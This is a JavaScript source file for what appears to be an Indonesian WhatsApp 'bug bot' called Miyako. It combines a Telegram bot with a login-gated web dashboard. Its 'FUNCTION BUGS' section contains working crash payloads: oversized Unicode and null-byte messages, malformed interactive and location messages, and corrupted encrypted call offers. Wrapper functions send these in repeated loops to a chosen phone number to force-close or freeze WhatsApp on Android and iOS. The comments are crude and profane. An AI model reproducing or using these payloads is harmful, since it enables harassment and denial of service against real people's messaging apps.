⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠄⢂⠀⠀⠀⠀⠀⣀⣠⠠⢖⣋⡥⢖⣩⠔⠊⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣨⠭⢵⣒⣩⠬⢖⠏⠁⢀⣀⠀⠀⠀
⠀⠀⠈⠓⠒⠦⠍⠭⠭⣭⠭⠭⠭⠭⡿⡓⠒⠛⠉⠉⠀⠀⣠⠇⠀⠀⠘⠞⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠁⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠉⠉⠙⠒⠒⠚⠉⠁⠀⠀⠀⠁⢣⡎⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

   ___  _     __  _          _____            
  / _ \\(_)___/ /_(_)  _____ / ___/__  _______ 
 / // / / __/ __/ / |/ / -_) /__/ _ \\/ __/ -_)
/____/_/\\__/\\__/_/|___/\\__/\\___/\\___/_/  \\__/ 
`))

console.log(chalk.cyanBright(`
─────────────────────────────────────
NAME APPS   : Miyako
AUTHOR      : mizukisnji
ID OWN      : ${ownerIds}
VERSION     : 2
─────────────────────────────────────\n\n`));

bot.launch();

// Si anjing sialan ini yang bikin gw pusing 
setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

// nambahin periodic health check biar aman aja
setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);
  
  // Only attempt reload if we have registered sessions but none are active
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0; // Reset counter
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000); // Check setiap 10 menit

// ================ FUNCTION BUGS HERE ================== \\

async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/OTAX",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "OTAX",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 100; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};
async function Abimlagisange(sock, target) {
  try {
    const datamsg1 = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: "https://files.catbox.moe/f08c4n.jpg",
            mimetype: "image/jpeg",
            body: {
              text: "ꦽ".repeat(3000),
              name: "galaxy_message",
              buttonParamsJson: ""
            }
          },

          nativeFlowMessage: {
            name: "call_permission_request",
            buttonParamsJson: JSON.stringify({
              status: true
            })
          },

          contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast"
          },

          nativeFlowMessage2: {
            name: "call_permission_request",
            buttonParamsJson: "\u0000".repeat(3000)
          },

          interactiveMessage2: {
            body: "abim syg salsa🐉"
          },

          viewOnceMessage2: {
            text: "...",
            nativeFlowResponseMessage: {
              title: "[ ABIM ] - ISBACK" + "𑇂𑆵𑆴𑆿".repeat(5000),
              name: "cta_reply",
              buttonParamsJson: "{}"
            }
          },

          extraButtons: [
            {
              name: "cta_cancel_reminder",
              buttonParamsJson: "\u0000".repeat(1000)
            },
            {
              name: "address_message",
              buttonParamsJson: "\u0000".repeat(2000)
            }
          ],

          businessMessageForwardInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net"
          },

          mentionedJid2: [
            target,
            "1@s.whatsapp.net",
            "0@s.whatsapp.net",
            ...Array.from({ length: 1997 }, () =>
              `${Math.floor(
                100000000000 + Math.random() * 899999999999
              )}@s.whatsapp.net`
            )
          ]
        }
      }
    };

    for (const msg of [datamsg1]) {
      await sock.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }
            ]
          }
        ]
      });
    }

    console.log(`Wolker Your Devices 🤟Sending To ${target} suksesfull`);
  } catch (e) {
    console.error(e);
  }
}
async function Akaro(sock, target) {
  const AktaVerse = {
    extendedTextMessage: {
      text: "\u0000".repeat(1000000), 
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "janingam",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage:{ 
                        name: "galaxy_message",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3,
                    }, 
                }, 
            } 
        } 
    } 
}

 const AtaraVerse = {
    extendedTextMessage: {
      text: "\u0000".repeat(1000000), 
      contextInfo: {
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }, 
        mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z+1}@s.whatsapp.net`) 
      }
    }
  };
  
  const AkaroVerse = [
    generateWAMessageFromContent(target, AktaVerse, {}),
    generateWAMessageFromContent(target, AtaraVerse, {})
  ];
  
  await sock.relayMessage(target, AkaroVerse.message, {
        messageId: AkaroVerse.key.id
    });
}
async function forceCloseV15Invis(sock, target, amount = 100) {
    const jid = target.includes('@') ? target : target + '@s.whatsapp.net';
    const poison = "ꦾ".repeat(500) + "๑".repeat(500) + "\u0E5B".repeat(9000);
    const invis = "\u200B\u200D\u200E".repeat(3333);

    for (let i = 0; i < amount; i++) {
        try {
            const id = "LKY-V15-" + Math.random().toString(36).substring(2, 10).toUpperCase();

            await sock.query({
                tag: "message",
                attrs: { to: jid, type: "text", id: id },
                content: [
                    {
                        tag: "meta",
                        attrs: { priority: "high" },
                        content: []
                    },
                    {
                        tag: "biz",
                        attrs: {},
                        content: [{
                            tag: "interactive",
                            attrs: { v: "1", type: "native_flow" },
                            content: [
                                {
                                    tag: "header",
                                    attrs: { hasMediaAttachment: "true" },
                                    content: [{
                                        tag: "title",
                                        attrs: {},
                                        content: poison
                                    }]
                                },
                                {
                                    tag: "body",
                                    attrs: {},
                                    content: [{
                                        tag: "text",
                                        attrs: {},
                                        content: invis
                                    }]
                                },
                                {
                                    tag: "native_flow",
                                    attrs: { name: "quick_reply" },
                                    content: [{
                                        tag: "payload",
                                        attrs: {},
                                        content: Buffer.from("\x00\x01".repeat(5000))
                                    }]
                                }
                            ]
                        }]
                    },
                    {
                        tag: "contextInfo",
                        attrs: {},
                        content: [
                            { tag: "mentionedJid", attrs: {}, content: jid },
                            {
                                tag: "externalAdReply",
                                attrs: {
                                    title: poison.substring(0, 1000),
                                    mediaType: "1",
                                    thumbnailUrl: "https://",
                                    sourceUrl: "https://"
                                },
                                content: []
                            }
                        ]
                    }
                ]
            });

            if (i % 25 === 0) await new Promise(r => setTimeout(r, 80));
        } catch (e) {
            continue;
        }
    }
}
async function callCrash(Yuukey, target) {
const { jidDecode, jidEncode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
let devices = (
await Yuukey.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await Yuukey.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = Yuukey.createParticipantNodes.bind(Yuukey);
let yntkts = Yuukey.encodeWAMessage?.bind(Yuukey);

Yuukey.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (Yuukey.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = Yuukey.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await Yuukey.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await Yuukey.createParticipantNodes(devices, { conversation: "7eppeli - Exposed" }, { count: '0' });

let stanza = {
tag: "call",
attrs: { to: target, id: Yuukey.generateMessageTag(), from: Yuukey.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": Yuukey.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(Yuukey.authState.creds.account, true)
}] : [])
]
}]
};

await Yuukey.sendNode(stanza);
}

// INI BUAT BUTTON DELAY 50% YA ANJINKK@)$+$)+@((_
async function delaylow(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delaylow');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 120) {
        await Promise.all([
          Abimlagisange(sock, X),
          Akaro(sock, X),
          sleep(500)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// INI BUAT BUTTON DELAY 100% YA ANJINKK@)$+$)+@((_
async function delayhigh(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delayhigh');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 50) {        
        await Promise.all([
          protocolbug18(sock, X),
          BandangV1(sock, X),
          bandangV2(sock, X),
          sleep(2000)
        ]);
        
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/50 delayhigh 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// INI BUAT BUTTON ANDROID BLANK
async function androkill(sock, target) {
     for (let i = 0; i < 25; i++) {
         await forceCloseV15Invis(sock, target);
         await callCrash(sock, target);
         await sleep(1000);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
// INI BUAT BUTTON BLANK IOS
async function blankios(sock, target) {
     for (let i = 0; i < 1; i++) {
         await PouButtonUi(sock, target);
         await iosinVisFC3(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// INI BUAT BUTTON IOS INVISIBLE
async function fcios(sock, target) {
     for (let i = 0; i < 50; i++) {
         await iosinVisFC3(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// INI BUAT BUTTON FORCE CLOSE MMEK LAH MASA GA TAU
async function forklos(sock, target) {
     for (let i = 0; i < 3; i++) {
         await PouHitam(sock, target);
         await N3xithBlank(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// Middleware untuk parsing JSON
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "Miyako", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 }); 
  res.redirect("/dashboard");
});

// Tambahkan auth middleware untuk WiFi Killer
// Route untuk dashboard

app.get("/dashboard", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "dashboard.html"); // atau file lain jika ada
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file dashboard:", err);
      return res.status(500).send("File dashboard tidak ditemukan");
    }
    res.send(html);
  });
});

// Endpoint untuk mendapatkan data user dan session
app.get("/api/option-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  // Ambil role dari data user
  const userRole = currentUser.role || 'user';

  // Format expired time
  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  // Hitung waktu tersisa
  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  res.json({
    username: currentUser.username,
    role: userRole,
    activeSenders: sessions.size,
    expired: expired,
    daysRemaining: daysRemaining
  });
});
      
app.get("/profile", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "profil.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/tiktok", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "tiktok.html");
